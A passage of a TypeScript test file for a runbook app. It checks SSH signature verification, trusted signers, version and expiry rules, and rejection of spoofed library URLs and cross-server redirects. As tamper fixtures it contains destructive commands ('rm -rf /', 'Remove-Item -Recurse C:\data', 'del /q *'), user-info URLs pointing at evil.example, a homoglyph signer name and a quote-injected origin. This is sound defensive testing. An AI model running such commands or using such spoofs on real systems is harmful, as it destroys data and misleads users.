/**
 * The team library's signature checks and the answers it trusts (security review 2026-11-14):
 * SSHSIG parity with OpenSSH, what "verified" covers, signed names, versions and expiry, stale
 * states, signedOnly, per-library trust, addresses, redirects and sizes.
 */
import { createHash, generateKeyPairSync, sign as nodeSign } from 'node:crypto';
import type { KeyObject } from 'node:crypto';
import { Buffer } from 'buffer';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { SIGNATURE_NAMESPACE, buildManifest, formatManifest, signedStatus, withSignature } from '@md-runbook/core/signing';
import {
  MAX_LIBRARY_CHARS,
  allowUnverified,
  copyRefusal,
  fetchLibrary,
  forgetVersions,
  hasRememberedVersions,
  highestVersion,
  loadLibraryMemory,
  redirectedAway,
  signedOnlyPolicy,
  libraryKeys,
  libraryLinkUrl,
  libraryState,
  libraryUrlProblem,
  nameFitsPath,
  normalizeLibraryUrl,
  openLibraryRunbook,
  openableReason,
  planUpdate,
  refreshLibrary,
  resetLibrary,
  signatureOf,
  signedFacts,
  withdrawnKeys,
  libraryHash,
} from '../runbooks/library';
import type { Library, LibraryEntry } from '../runbooks/library';
import { getRunbook, resetRunbooks } from '../runbooks/store';
import { resetSettings, setLibraryUrl } from '../settings/store';
import {
  ADDED_BY_YOU,
  addSigners,
  coverage,
  keysFor,
  loadTrustedSigners,
  migrateTrustedSigners,
  parseAllowedSigners,
  removeTrustedSigner,
  reportSigner,
  resetTrustedSigners,
  signatureState,
  trustSigners,
  withdrawnSigner,
  trustedFor,
  trustedSigners,
  unsignedRunnable,
} from '../signing/trust';
import * as origin from '../runbooks/origin';
import { CannotCheck, verifySshsig } from '../signing/verify';

const LIB = 'https://runbooks.example.net/team/';
/** A device without Web Crypto (an explicit undefined would take the default). */
const NO_WEB_CRYPTO = null as unknown as SubtleCrypto;
const OTHER = 'https://other.example.net/lib/';
const fence = (info: string, body: string): string => '```' + info + '\n' + body + '\n```\n';
const RUNBOOK = '# Restart the API\n\n' + fence('bash', 'systemctl restart api') + '\n' + fence('bash', 'systemctl status api');

// ---- SSH wire format and SSHSIG blobs made with node:crypto ----

const str = (b: Uint8Array | string): Buffer => {
  const v = typeof b === 'string' ? Buffer.from(b) : Buffer.from(b);
  const n = Buffer.alloc(4);
  n.writeUInt32BE(v.length, 0);
  return Buffer.concat([n, v]);
};
const u32 = (n: number): Buffer => {
  const b = Buffer.alloc(4);
  b.writeUInt32BE(n, 0);
  return b;
};
const mpint = (b: Buffer): Buffer => {
  let i = 0;
  while (i < b.length - 1 && b[i] === 0) i++;
  const v = b.subarray(i);
  return str(v[0]! & 0x80 ? Buffer.concat([Buffer.from([0]), v]) : v);
};
const sha256 = (b: Uint8Array | string): Buffer => createHash('sha256').update(b).digest();
const b64url = (b: Buffer): string => b.toString('base64url');

interface Blob {
  namespace?: string;
  hash?: 'sha256' | 'sha512';
}
/** What an SSHSIG signs for `message` (PROTOCOL.sshsig). */
const signedData = (message: string, o: Blob = {}): Buffer => {
  const hash = o.hash ?? 'sha512';
  return Buffer.concat([
    Buffer.from('SSHSIG'),
    str(o.namespace ?? 'md-runbook'),
    str(''),
    str(hash),
    str(createHash(hash).update(message).digest()),
  ]);
};
/** The SSHSIG blob (base64) around a public key and a signature blob. */
const sshsigBlob = (pub: Buffer, sig: Buffer, o: Blob = {}): string =>
  Buffer.concat([
    Buffer.from('SSHSIG'),
    u32(1),
    str(pub),
    str(o.namespace ?? 'md-runbook'),
    str(''),
    str(o.hash ?? 'sha512'),
    str(sig),
  ]).toString('base64');

function ed25519() {
  const k = generateKeyPairSync('ed25519');
  const pub = Buffer.concat([str('ssh-ed25519'), str(Buffer.from(k.publicKey.export({ format: 'jwk' }).x!, 'base64url'))]);
  /** The raw Ed25519 signature of what SSHSIG signs for `message`. */
  const raw = (message: string, o: Blob = {}): Buffer => nodeSign(null, signedData(message, o), k.privateKey);
  return {
    pub,
    type: 'ssh-ed25519',
    raw,
    sign: (message: string, o: Blob = {}, extra = Buffer.alloc(0)): string =>
      sshsigBlob(pub, Buffer.concat([str('ssh-ed25519'), str(raw(message, o)), extra]), o),
  };
}

function p256(): { priv: KeyObject; point: Buffer } {
  const k = generateKeyPairSync('ec', { namedCurve: 'prime256v1' });
  const jwk = k.publicKey.export({ format: 'jwk' });
  return {
    priv: k.privateKey,
    point: Buffer.concat([Buffer.from([4]), Buffer.from(jwk.x!, 'base64url'), Buffer.from(jwk.y!, 'base64url')]),
  };
}
/** mpint r ‖ mpint s of an ECDSA P-256 signature over `data` (SHA-256). */
const ecdsaSig = (priv: KeyObject, data: Buffer): Buffer => {
  const rs = nodeSign('sha256', data, { key: priv, dsaEncoding: 'ieee-p1363' });
  return Buffer.concat([mpint(rs.subarray(0, 32)), mpint(rs.subarray(32))]);
};

function ecdsa() {
  const { priv, point } = p256();
  const pub = Buffer.concat([str('ecdsa-sha2-nistp256'), str('nistp256'), str(point)]);
  return {
    pub,
    type: 'ecdsa-sha2-nistp256',
    sign: (message: string, o: Blob = {}): string =>
      sshsigBlob(pub, Buffer.concat([str('ecdsa-sha2-nistp256'), str(ecdsaSig(priv, signedData(message, o)))]), o),
  };
}

const APP = 'ssh:';
function skEcdsa() {
  const { priv, point } = p256();
  const type = 'sk-ecdsa-sha2-nistp256@openssh.com';
  const pub = Buffer.concat([str(type), str('nistp256'), str(point), str(APP)]);
  return {
    pub,
    type,
    sign: (message: string, flags = 0x01): string => {
      const counter = u32(7);
      const data = Buffer.concat([sha256(APP), Buffer.from([flags]), counter, sha256(signedData(message))]);
      return sshsigBlob(pub, Buffer.concat([str(type), str(ecdsaSig(priv, data)), Buffer.from([flags]), counter]));
    },
    /** A passkey's signature (webauthn-sk-ecdsa-sha2-nistp256@openssh.com), as the app's web passkeys make them. */
    webauthn: (message: string, o: { flags?: number; origin?: string; extensions?: Buffer } = {}): string => {
      const flags = o.flags ?? 0x05;
      const origin = o.origin ?? 'https://app.example.net';
      const extensions = o.extensions ?? Buffer.alloc(0);
      const counter = u32(9);
      const clientData = Buffer.from(
        `{"type":"webauthn.get","challenge":"${b64url(signedData(message))}","origin":"${origin}","crossOrigin":false}`,
      );
      const data = Buffer.concat([sha256(APP), Buffer.from([flags]), counter, extensions, sha256(clientData)]);
      return sshsigBlob(
        pub,
        Buffer.concat([
          str('webauthn-sk-ecdsa-sha2-nistp256@openssh.com'),
          str(ecdsaSig(priv, data)),
          Buffer.from([flags]),
          counter,
          str(origin),
          str(clientData),
          str(extensions),
        ]),
      );
    },
  };
}

function rsa(bits: number) {
  const k = generateKeyPairSync('rsa', { modulusLength: bits });
  const jwk = k.publicKey.export({ format: 'jwk' });
  const pub = Buffer.concat([str('ssh-rsa'), mpint(Buffer.from(jwk.e!, 'base64url')), mpint(Buffer.from(jwk.n!, 'base64url'))]);
  return {
    pub,
    sign: (message: string): string =>
      sshsigBlob(pub, Buffer.concat([str('rsa-sha2-512'), str(nodeSign('sha512', signedData(message), k.privateKey))])),
  };
}

/** The runbook with a signature block whose SSHSIG `sign` makes over its manifest. */
function signedWith(
  text: string,
  signer: string,
  sign: (manifest: string) => string,
  meta: { name?: string; version?: number; expires?: string; manifestVersion?: 1 | 2 } = {},
): string {
  const built = buildManifest(
    text,
    {
      name: meta.name ?? 'restart',
      version: meta.version ?? 1,
      ...(meta.expires ? { expires: meta.expires } : {}),
      scopes: [],
      patterns: {},
    },
    // Manifest version 2 (the whole text) unless asked for 1 (the blocks only, as signed before).
    { version: meta.manifestVersion ?? 2 },
  );
  if ('errors' in built) throw new Error(built.errors.join('; '));
  const manifest = formatManifest(built.manifest);
  return withSignature(text, { signer, signed: '2026-11-14', manifest, signature: sign(manifest) });
}

const linesFor = (name: string, k: { type?: string; pub: Buffer }): string => `${name} ${k.type ?? 'ssh-rsa'} ${k.pub.toString('base64')}`;

/** A fetch that answers from a table of URLs (anything else: 404). */
function server(files: Record<string, string>): typeof fetch {
  return (async (url: string) => {
    const body = files[url];
    return body === undefined
      ? { ok: false, status: 404, url, headers: new Headers(), text: async () => 'not found' }
      : { ok: true, status: 200, url, headers: new Headers(), text: async () => body };
  }) as unknown as typeof fetch;
}

beforeEach(async () => {
  await AsyncStorage.clear();
  resetRunbooks();
  resetSettings();
  resetTrustedSigners();
  resetLibrary();
});

describe('SSHSIG as OpenSSH checks it', () => {
  it('ECDSA P-256 signatures check out; another message, namespace or a truncated signature does not', async () => {
    const k = ecdsa();
    expect(await verifySshsig(k.sign('manifest'), 'manifest', SIGNATURE_NAMESPACE)).toBe(true);
    expect(await verifySshsig(k.sign('manifest', { hash: 'sha256' }), 'manifest', SIGNATURE_NAMESPACE)).toBe(true);
    expect(await verifySshsig(k.sign('manifest'), 'manifest!', SIGNATURE_NAMESPACE)).toBe(false);
    expect(await verifySshsig(k.sign('manifest', { namespace: 'git' }), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
    // The blob cut short: the inner signature string is no longer whole.
    const blob = Buffer.from(k.sign('manifest'), 'base64');
    expect(await verifySshsig(blob.subarray(0, blob.length - 5).toString('base64'), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
  });

  it('security keys (sk-ecdsa) and passkeys (webauthn): user presence, no attested data, extensions as flagged, no quote in the origin', async () => {
    const k = skEcdsa();
    expect(await verifySshsig(k.sign('manifest'), 'manifest', SIGNATURE_NAMESPACE)).toBe(true);
    expect(await verifySshsig(k.sign('manifest', 0x00), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
    expect(await verifySshsig(k.webauthn('manifest'), 'manifest', SIGNATURE_NAMESPACE)).toBe(true);
    expect(await verifySshsig(k.webauthn('manifest'), 'other', SIGNATURE_NAMESPACE)).toBe(false);
    // Attested credential data (AD) never belongs in an assertion.
    expect(await verifySshsig(k.webauthn('manifest', { flags: 0x45 }), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
    // ED set without extensions, and extensions without ED.
    expect(await verifySshsig(k.webauthn('manifest', { flags: 0x85 }), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
    expect(await verifySshsig(k.webauthn('manifest', { extensions: Buffer.from([0xa0]) }), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
    expect(
      await verifySshsig(k.webauthn('manifest', { flags: 0x85, extensions: Buffer.from([0xa0]) }), 'manifest', SIGNATURE_NAMESPACE),
    ).toBe(true);
    expect(
      await verifySshsig(k.webauthn('manifest', { origin: 'https://x.example","origin":"https://y' }), 'manifest', SIGNATURE_NAMESPACE),
    ).toBe(false);
  });

  it('bytes after the last field of the signature are refused; RSA keys under 2048 bits are refused', async () => {
    const k = ed25519();
    expect(await verifySshsig(k.sign('manifest'), 'manifest', SIGNATURE_NAMESPACE)).toBe(true);
    expect(await verifySshsig(k.sign('manifest', {}, Buffer.from([0])), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
    expect(await verifySshsig(rsa(2048).sign('manifest'), 'manifest', SIGNATURE_NAMESPACE)).toBe(true);
    expect(await verifySshsig(rsa(1024).sign('manifest'), 'manifest', SIGNATURE_NAMESPACE)).toBe(false);
  });

  it('only a device without Web Crypto (or an algorithm it lacks) is "can\'t check"; anything malformed is false', async () => {
    await expect(verifySshsig(ed25519().sign('m'), 'm', SIGNATURE_NAMESPACE, NO_WEB_CRYPTO)).rejects.toBeInstanceOf(CannotCheck);
    const unsupported = {
      digest: (a: AlgorithmIdentifier, d: BufferSource) => globalThis.crypto.subtle.digest(a, d),
      importKey: async () => {
        throw Object.assign(new Error('Unrecognized algorithm name'), { name: 'NotSupportedError' });
      },
    } as unknown as SubtleCrypto;
    await expect(verifySshsig(ed25519().sign('m'), 'm', SIGNATURE_NAMESPACE, unsupported)).rejects.toBeInstanceOf(CannotCheck);
    const broken = {
      digest: (a: AlgorithmIdentifier, d: BufferSource) => globalThis.crypto.subtle.digest(a, d),
      importKey: async () => {
        throw Object.assign(new Error('bad key data'), { name: 'DataError' });
      },
    } as unknown as SubtleCrypto;
    expect(await verifySshsig(ed25519().sign('m'), 'm', SIGNATURE_NAMESPACE, broken)).toBe(false);
    // A verify that answers anything but true is not a yes.
    const sloppy = {
      digest: (a: AlgorithmIdentifier, d: BufferSource) => globalThis.crypto.subtle.digest(a, d),
      importKey: async () => ({}),
      verify: async () => 1,
    } as unknown as SubtleCrypto;
    expect(await verifySshsig(ed25519().sign('m'), 'm', SIGNATURE_NAMESPACE, sloppy)).toBe(false);
  });

  it("allowed_signers: read strictly, as OpenSSH reads it: the review's escaped line, stray quotes, unquoted values, odd blanks", () => {
    const k1 = ed25519().pub.toString('base64');
    const k2 = ed25519().pub.toString('base64');
    const lines = [
      // OpenSSH skips \" inside quotes: it trusts k2 here, a naive reader shows k1.
      `alice namespaces="md-runbook,\\" ssh-ed25519 ${k1} x" ssh-ed25519 ${k2}`,
      `alice namespaces=md-runbook ssh-ed25519 ${k1}`,
      `alice valid-before=20991231 ssh-ed25519 ${k1}`,
      `alice namespaces="md-runbook",namespaces="git" ssh-ed25519 ${k1}`,
      `alice namespaces="md-runbook" ssh-ed25519 ${k1} "x`,
      `al"ice namespaces="md-runbook" ssh-ed25519 ${k1}`,
      `alice namespaces="md-runbook"\u00a0ssh-ed25519 ${k1}`,
      `alice\u202e namespaces="md-runbook" ssh-ed25519 ${k1}`,
      `alice valid-before="soon" ssh-ed25519 ${k1}`,
    ];
    const got = parseAllowedSigners(lines.join('\n'), SIGNATURE_NAMESPACE);
    expect(got.signers).toEqual([]);
    expect(got.skipped).toBe(lines.length);
    expect(parseAllowedSigners(`alice\tnamespaces="md-runbook"\tssh-ed25519 ${k1}`, SIGNATURE_NAMESPACE).signers).toHaveLength(1);
  });

  it('allowed_signers: a line with an option OpenSSH does not know is refused, as there', () => {
    const k = ed25519();
    const key = `ssh-ed25519 ${k.pub.toString('base64')}`;
    const got = parseAllowedSigners(
      [`alice@example.net ${key}`, `bob@example.net no-touch-required ${key}`, `carol@example.net VALID-AFTER="20200101" ${key}`].join(
        '\n',
      ),
      SIGNATURE_NAMESPACE,
    );
    expect(got.signers.map((s) => s.principals[0])).toEqual(['alice@example.net', 'carol@example.net']);
    expect(got.skipped).toBe(1);
  });
});

describe('what a library runbook’s signature is worth', () => {
  it('a garbage, foreign or truncated signature under a manifest is invalid, not unknown', async () => {
    const k = ed25519();
    const garbage = signedWith(RUNBOOK, 'x', () => 'AAAA');
    // Nobody trusted at all: still not "signed, unknown signer".
    expect(await signatureState(garbage, [])).toMatchObject({ kind: 'invalid' });
    expect(
      await signatureState(
        signedWith(RUNBOOK, 'alice', (m) => k.sign(m, { namespace: 'git' })),
        [],
      ),
    ).toMatchObject({
      kind: 'invalid',
    });
    // Under a trusted name and key: a truncated inner signature does not check out.
    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
    // A well-formed blob whose Ed25519 signature lost its last byte.
    const truncated = signedWith(RUNBOOK, 'alice', (m) =>
      sshsigBlob(k.pub, Buffer.concat([str('ssh-ed25519'), str(k.raw(m).subarray(0, 63))])),
    );
    expect(await signatureState(truncated, keys)).toEqual({ kind: 'invalid', signers: ['alice'] });
    expect(
      await signatureState(
        signedWith(RUNBOOK, 'alice', (m) => k.sign(m)),
        keys,
      ),
    ).toMatchObject({ kind: 'verified' });
    // A name no principal could spell the same way is never shown as verified.
    // (The app writes names through signerLabel; a hand-made block can hold anything.)
    const homoglyph = signedWith(RUNBOOK, 'alice', (m) => k.sign(m)).replace('signer=alice', 'signer=\u0430lice');
    expect(homoglyph).toContain('signer=\u0430lice');
    // Core reads no signature block with such a name since the signature review (SIGNER_NAME_RE): not signed, never verified.
    expect(
      await signatureState(homoglyph, parseAllowedSigners(`* ssh-ed25519 ${k.pub.toString('base64')}`, SIGNATURE_NAMESPACE).signers),
    ).toMatchObject({
      kind: 'unsigned',
    });
    // No Web Crypto on this device: can't check, not verified.
    expect(
      await signatureState(
        signedWith(RUNBOOK, 'alice', (m) => k.sign(m)),
        keys,
        NO_WEB_CRYPTO,
      ),
    ).toMatchObject({ kind: 'unknown' });
  });

  it('a PowerShell or cmd block added to a signed runbook: partly signed, not verified', async () => {
    const k = ed25519();
    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
    const good = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { manifestVersion: 1 });
    const status = signedStatus(good)!;
    expect(coverage(status)).toBe('partial');
    const added = good.replace('# Restart the API\n', '# Restart the API\n\n' + fence('powershell', 'Remove-Item -Recurse C:\\data'));
    const state = await signatureState(added, keys);
    expect(state).toMatchObject({ kind: 'partial', unsigned: 1, verified: [{ name: 'alice' }] });
    const lib = { base: LIB, signedOnly: true };
    expect(openableReason(lib, { text: added, path: 'restart.md' }, state)).toMatch(/1 block that can run uncovered/);
    expect(await signatureState(good.replace('# Restart', fence('cmd', 'del /q *') + '\n# Restart'), keys)).toMatchObject({
      kind: 'partial',
    });
    // A bash block added is a change (as before).
    expect(
      await signatureState(good.replace('# Restart the API\n', '# Restart the API\n\n' + fence('sh', 'rm -rf /')), keys),
    ).toMatchObject({
      kind: 'changed',
    });
  });

  it('a wildcard principal: verified with the key’s fingerprint, for the names its pattern allows', async () => {
    const k = ed25519();
    const keys = parseAllowedSigners(`*@corp.example ssh-ed25519 ${k.pub.toString('base64')}`, SIGNATURE_NAMESPACE).signers;
    const text = signedWith(RUNBOOK, 'security-team@corp.example', (m) => k.sign(m));
    expect(await signatureState(text, keys)).toMatchObject({
      kind: 'verified',
      verified: [{ name: 'security-team@corp.example', wildcard: true, fingerprint: keys[0]!.fingerprint }],
    });
    expect(
      await signatureState(
        signedWith(RUNBOOK, 'eve@evil.example', (m) => k.sign(m)),
        keys,
      ),
    ).toMatchObject({ kind: 'unknown' });
  });

  it('the signed name, version and expiry: another name than the file, an expired manifest, a lower version', async () => {
    const k = ed25519();
    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
    const v3 = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { name: 'db/drop-staging', version: 3 });
    const s3 = await signatureState(v3, keys);
    expect(signedFacts(LIB, 'restart-web.md', s3)).toEqual({ name: 'db/drop-staging', version: 3, otherName: true });
    expect(signedFacts(LIB, 'db/drop-staging.md', s3)).toEqual({ name: 'db/drop-staging', version: 3, otherName: false });
    // The whole signed name is the end of the path (finding B of the recheck).
    expect(nameFitsPath('restart', 'ops/Restart.runbook.md')).toBe(true);
    expect(nameFitsPath('ops/restart', 'ops/restart.md')).toBe(true);
    expect(nameFitsPath('ops/restart', 'x/ops/restart.md')).toBe(true);
    expect(nameFitsPath('ops/restart', 'restart.md')).toBe(false);
    expect(nameFitsPath('staging/restart', 'prod/restart.md')).toBe(false);
    expect(nameFitsPath('ops/restart', 'anything/restart.md')).toBe(false);
    expect(nameFitsPath('restart', 'prerestart.md')).toBe(false);

    const expired = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { expires: '2020-01-01' });
    const se = await signatureState(expired, keys);
    expect(se).toMatchObject({ kind: 'expired', manifest: { expires: '2020-01-01' } });
    expect(openableReason({ base: LIB, signedOnly: true }, { text: expired, path: 'restart.md' }, se)).toMatch(/expired on 2020-01-01/);
    // The last day still counts (UTC, as the gate compares).
    expect(await signatureState(expired, keys, globalThis.crypto.subtle, Date.UTC(2020, 0, 1, 23))).toMatchObject({ kind: 'verified' });
  });

  it('a lower version than one seen before: refused under signedOnly, a warning on Update otherwise', async () => {
    const k = ed25519();
    const line = linesFor('alice', k);
    const v1 = signedWith(RUNBOOK, 'alice', (m) => k.sign(m), { name: 'restart', version: 1 });
    const v2 = signedWith(RUNBOOK + '\nv2\n', 'alice', (m) => k.sign(m), { name: 'restart', version: 2 });
    const files: Record<string, string> = {
      [LIB + 'index.json']: JSON.stringify({ signedOnly: true, runbooks: ['restart.md'] }),
      [LIB + 'restart.md']: v2,
      [LIB + 'allowed_signers']: line,
    };
    setLibraryUrl(LIB);
    await refreshLibrary({ fetcher: server(files) });
    trustSigners(libraryState().library!.signers!.list, LIB);
    await refreshLibrary({ fetcher: server(files), force: true });
    const e2 = libraryState().library!.entries[0]!;
    const opened = await openLibraryRunbook(libraryState().library!, e2);
    if (opened.kind !== 'opened') throw new Error(opened.message);
    // Someone puts version 1 back.
    files[LIB + 'restart.md'] = v1;
    await refreshLibrary({ fetcher: server(files), force: true });
    const lib = libraryState().library!;
    const e1 = lib.entries[0]!;
    const s1 = signatureOf(libraryState(), e1);
    expect(s1).toMatchObject({ kind: 'verified', manifest: { version: 1 } });
    expect(signedFacts(LIB, e1.path, s1)).toMatchObject({ olderThan: 2 });
    expect(openableReason(lib, e1, s1)).toMatch(/version 1, older than version 2/);
    // Not signedOnly: Update says so.
    const plan = planUpdate(getRunbook(opened.runbook.id)!, { ...e1, text: v1 }, s1!, 2);
    expect(plan.warnings).toContainEqual({ kind: 'older-version', name: 'restart', now: 1, seen: 2 });
    // Remembered after a restart (resetLibrary clears what is in memory only).
    resetLibrary();
    await refreshLibrary({ fetcher: server(files), force: true });
    expect(signedFacts(LIB, 'restart.md', signatureOf(libraryState(), libraryState().library!.entries[0]!))).toMatchObject({
      olderThan: 2,
    });
  });

  it('no stale state: a changed file has no state until its own is computed', async () => {
    const k = ed25519();
    const files: Record<string, string> = {
      [LIB + 'index.json']: JSON.stringify(['restart.md']),
      [LIB + 'restart.md']: signedWith(RUNBOOK, 'alice', (m) => k.sign(m)),
      [LIB + 'allowed_signers']: linesFor('alice', k),
    };
    setLibraryUrl(LIB);
    await refreshLibrary({ fetcher: server(files) });
    trustSigners(libraryState().library!.signers!.list, LIB);
    await refreshLibrary({ fetcher: server(files), force: true });
    expect(signatureOf(libraryState(), libraryState().library!.entries[0]!)).toMatchObject({ kind: 'verified' });
    // The file changes (here signed again, its prose changed): while its state is computed, the
    // entry has none, never the previous text's "verified".
    const next = signedWith(RUNBOOK + '\nNew notes.\n', 'alice', (m) => k.sign(m), { version: 2 });
    files[LIB + 'restart.md'] = next;
    let release!: () => void;
    const gate = new Promise<void>((resolve) => (release = resolve));
    const seen: (string | undefined)[] = [];
    const realDigest = globalThis.crypto.subtle.digest.bind(globalThis.crypto.subtle);
    const spy = jest.spyOn(globalThis.crypto.subtle, 'digest').mockImplementation(async (a, d) => {
      await gate;
      return realDigest(a, d);
    });
    try {
      const refresh = refreshLibrary({ fetcher: server(files), force: true });
      // Wait until the new texts are listed.
      for (let i = 0; i < 50 && libraryState().library?.entries[0]?.text !== files[LIB + 'restart.md']; i++)
        await new Promise((r) => setTimeout(r, 0));
      const entry = libraryState().library!.entries[0]!;
      seen.push(signatureOf(libraryState(), entry)?.kind);
      release();
      await refresh;
    } finally {
      release();
      spy.mockRestore();
    }
    expect(seen).toEqual([undefined]);
    expect(signatureOf(libraryState(), libraryState().library!.entries[0]!)).toMatchObject({ kind: 'verified', manifest: { version: 2 } });
    expect(Object.keys(libraryState().signatures)).toEqual([libraryHash(next)]);
  });

  it('signedOnly opens verified runbooks only, and stays on when the server stops asking, until the user agrees', async () => {
    const k = ed25519();
    const files: Record<string, string> = {
      [LIB + 'index.json']: JSON.stringify({ signedOnly: true, runbooks: ['restart.md'] }),
      [LIB + 'restart.md']: signedWith(RUNBOOK, 'alice', (m) => k.sign(m)),
    };
    setLibraryUrl(LIB);
    await refreshLibrary({ fetcher: server(files) });
    let lib = libraryState().library!;
    expect(lib.signedOnly).toBe(true);
    // Signed and unchanged, but nobody trusted: not openable.
    expect(openableReason(lib, lib.entries[0]!, signatureOf(libraryState(), lib.entries[0]!))).toMatch(/trust its signers first/);
    files[LIB + 'index.json'] = JSON.stringify({ runbooks: ['restart.md'] });
    resetLibrary(); // a restart: what the app remembered comes from storage
    await refreshLibrary({ fetcher: server(files), force: true });
    lib = libraryState().library!;
    expect(lib).toMatchObject({ signedOnly: true, signedOnlyDropped: true });
    allowUnverified(LIB);
    expect(libraryState().library).toMatchObject({ signedOnly: false, signedOnlyDropped: false });
    await refreshLibrary({ fetcher: server(files), force: true });
    expect(libraryState().library).toMatchObject({ signedOnly: false });
  });

  it('a copy that exists is checked again when opened under signedOnly', async () => {
    const k = ed25519();
    const keys = parseAllowedSigners(linesFor('alice', k), SIGNATURE_NAMESPACE).signers;
    const good = signedWith(RUNBOOK, 'alice', (m) => k.sign(m));
    const entry: LibraryEntry = { path: 'restart.md', fileName: 'restart.md', folder: '', title: 'r', text: good, hash: libraryHash(good) };
    const lib: Library = { base: LIB, signedOnly: false, entries: [entry], signers: { list: keys, skipped: 0 } };
    const r = await openLibraryRunbook(lib, entry);
    expect(r.kind).toBe('opened');
    // The library turns signedOnly on; nobody is trusted from it: the copy is not opened from the list.
    expect(await openLibraryRunbook({ ...lib, signedOnly: true }, entry)).toMatchObject({
      kind: 'error',
      message: expect.stringMatching(/Your copy can't be opened from here/),
    });
    trustSigners(keys, LIB);
    expect(await openLibraryRunbook({ ...lib, signedOnly: true }, entry)).toMatchObject({ kind: 'opened' });
  });
});

describe('trusted signers belong to their library', () => {
  it('a key trusted from one library verifies nothing in another; Remove; a key the library no longer publishes', async () => {
    const k = ed25519();
    const list = parseAllowedSigners(linesFor('alice@corp.example', k), SIGNATURE_NAMESPACE).signers;
    const text = signedWith(RUNBOOK, 'alice@corp.example', (m) => k.sign(m));
    trustSigners(list, OTHER);
    expect(trustedSigners()).toHaveLength(1);
    const libA = { base: LIB, signers: { list, skipped: 0 } };
    const libB = { base: OTHER, signers: { list, skipped: 0 } };
    expect(await signatureState(text, libraryKeys(libA))).toMatchObject({ kind: 'unknown' });
    expect(await signatureState(text, libraryKeys(libB))).toMatchObject({ kind: 'verified' });
    // Trusted from both: two entries, each for its library.
    trustSigners(list, LIB);
    expect(trustedSigners()).toHaveLength(2);
    expect(await signatureState(text, libraryKeys(libA))).toMatchObject({ kind: 'verified' });
    removeTrustedSigner(trustedFor(LIB)[0]!);
    expect(await signatureState(text, libraryKeys(libA))).toMatchObject({ kind: 'unknown' });
    expect(trustedFor(OTHER)).toHaveLength(1);
    // The team removes the key from allowed_signers: it no longer counts, and is offered to forget.
    const removed = { base: OTHER, signers: { list: [], skipped: 0 } };
    expect(libraryKeys(removed)).toEqual([]);
    expect(withdrawnKeys(removed)).toHaveLength(1);
    expect(await signatureState(text, libraryKeys(removed))).toMatchObject({ kind: 'unknown' });
    // Not read (offline): the trusted keys still count.
    expect(libraryKeys({ base: OTHER })).toHaveLength(1);
  });
});

describe('the library address and what the server answers', () => {
  it('refuses user names, backslashes, blanks and control characters; stores the parsed form', () => {
    expect(libraryUrlProblem('https://runbooks.corp.example@evil.example/')).toMatch(/user name or password/);
    expect(libraryUrlProblem('https://user:pw@runbooks.example.net/')).toMatch(/user name or password/);
    expect(libraryUrlProblem('https://good.example\\@evil.example/')).toMatch(/Not a library address/);
    expect(libraryUrlProblem('https://good.example/a b/')).toMatch(/Not a library address/);
    expect(libraryUrlProblem('https://good.example/\u0007/')).toMatch(/Not a library address/);
    expect(libraryUrlProblem('https://good.example/\u202e/')).toMatch(/Not a library address/);
    expect(libraryUrlProblem(' https://runbooks.example.net/team ')).toBeUndefined();
    expect(normalizeLibraryUrl('HTTPS://Runbooks.Example.NET/team')).toBe('https://runbooks.example.net/team/');
    expect(normalizeLibraryUrl('https://runbooks.example.net')).toBe('https://runbooks.example.net/');
    expect(normalizeLibraryUrl('https://runbooks.example.net/a/../team')).toBe('https://runbooks.example.net/team/');
    // A link's address goes through the same check (LibraryAdd).
    const link = libraryLinkUrl('https://app.example.net/library?url=' + encodeURIComponent('https://a.example@evil.example/'));
    expect(libraryUrlProblem(link!)).toMatch(/user name or password/);
  });

  it('a redirect to another server is refused; one on the same server is followed', async () => {
    const files: Record<string, string> = { [LIB + 'index.json']: '["a.md", "b.md"]', [LIB + 'a.md']: RUNBOOK, [LIB + 'b.md']: RUNBOOK };
    const redirecting = (async (url: string) => {
      const final = url.endsWith('a.md') ? 'https://evil.example/a.md' : url.endsWith('b.md') ? LIB + 'moved/b.md' : url;
      const body = files[url];
      return body === undefined
        ? { ok: false, status: 404, url: final, headers: new Headers(), text: async () => '' }
        : { ok: true, status: 200, url: final, headers: new Headers(), text: async () => body };
    }) as unknown as typeof fetch;
    const got = await fetchLibrary(LIB, redirecting);
    if (got.kind !== 'ok') throw new Error(got.kind);
    expect(got.library.entries[0]).toMatchObject({
      path: 'a.md',
      error: expect.stringMatching(/redirected to another server \(evil.example\)/),
    });
    expect(got.library.entries[0]!.text).toBeUndefined();
    expect(got.library.entries[1]).toMatchObject({ path: 'b.md', text: RUNBOOK });
    // index.json itself: the whole library is refused.
    const all = (async (url: string) => ({
      ok: true,
      status: 200,
      url: 'https://evil.example/x',
      headers: new Headers(),
      text: async () => files[url] ?? '',
    })) as unknown as typeof fetch;
    expect(await fetchLibrary(LIB, all)).toMatchObject({ kind: 'error', message: expect.stringMatching(/redirected/) });
  });

  it('the size cap holds while reading: a stream past 2 MB is cut off, a Content-Length past it is not read', async () => {
    let read = 0;
    const chunk = new Uint8Array(512 * 1024).fill(0x61);
    const streaming = (async (url: string) => {
      if (url.endsWith('index.json'))
        return { ok: true, status: 200, url, headers: new Headers(), text: async () => '["big.md", "huge.md"]' };
      if (url.endsWith('allowed_signers')) return { ok: false, status: 404, url, headers: new Headers(), text: async () => '' };
      if (url.endsWith('huge.md'))
        return {
          ok: true,
          status: 200,
          url,
          headers: new Headers({ 'content-length': '999999999' }),
          text: async () => {
            throw new Error('read');
          },
        };
      return {
        ok: true,
        status: 200,
        url,
        headers: new Headers(),
        body: {
          getReader: () => ({
            read: async () => {
              read++;
              return read > 100 ? { done: true, value: undefined } : { done: false, value: chunk };
            },
            cancel: async () => undefined,
          }),
        },
        text: async () => {
          throw new Error('not streamed');
        },
      };
    }) as unknown as typeof fetch;
    const got = await fetchLibrary(LIB, streaming);
